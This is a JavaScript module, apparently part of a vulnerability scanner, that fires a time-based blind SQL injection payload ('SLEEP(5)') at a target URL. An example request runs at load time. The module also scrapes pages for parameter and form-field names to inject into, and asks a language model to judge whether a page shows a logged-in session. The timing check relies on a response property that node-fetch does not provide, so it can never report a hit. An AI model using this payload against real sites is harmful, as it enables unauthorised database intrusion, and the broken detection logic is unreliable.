const prompt = require('../fixUtils');
const cheerio = require('cheerio');
const { encode } = require('html-entities');

// Controller for vulnFix
const fetch = require('node-fetch');

async function performRequest(url, options) {
    try {
        const response = await fetch(url, options);
        return response;
    } catch (error) {
        throw new Error(`Fetch request failed: ${error.message}`);
    }
}

async function testTimeBased(url, method, payload, requestBody = {}) {
    try {
        const testUrl = method === 'GET' ? `${url}?${payload}` : url;
        const requestOptions = {
            method,
            headers: { 'Content-Type': 'application/json' },
            ...(method === 'POST' && { body: JSON.stringify(requestBody) }),
            sendTime: true,
        };

        const response = await performRequest(testUrl, requestOptions);

        if (response.responseTime && response.responseTime >= 5000) {
            console.log(`SQL injection successful on ${url}`);
        } else {
            console.log(`SQL injection not detected on ${url}`);
        }
    } catch (error) {
        console.error(`Error occurred: ${error.message}`);
    }
}

// Example usage:
const targetUrl = 'https://example.com/products';
const sqlPayload = "1' AND (SELECT * FROM (SELECT(SLEEP(5)))yZnD)--";
const requestMethod = 'GET'; // or 'POST'
const requestBody = { id: 1 }; // specify request body if using POST

testTimeBased(targetUrl, requestMethod, sqlPayload, requestBody);

async function checkPassed(html) {
    const request = `Given the following HTML content:
${encode(html)}

Please respond with Y if this page looks like a user page that he has already logged in and N for not a page that looks like an already logged-in page. Note: The system is now acting as a Web Application Firewall (WAF).`;

    const userResponse = await prompt(request);

    console.log('User response:', userResponse);
}


async function getData(html) {
    const $ = cheerio.load(html);

    const queryParams = [];
    const formDataNames = [];

    $('a').each(function() {
        const href = $(this).attr('href');
        const url = new URL(href, 'http://example.com');
        const searchParams = url.searchParams;
        searchParams.forEach(param => queryParams.push(param));
    });

    $('input, select, button').each(function() {
        const name = $(this).attr('name');
        if (name) formDataNames.push(name);
    });

    return { queryParams, formDataNames };
}

module.exports = {
    checkPassed,
    getData,
    testTimeBased,

}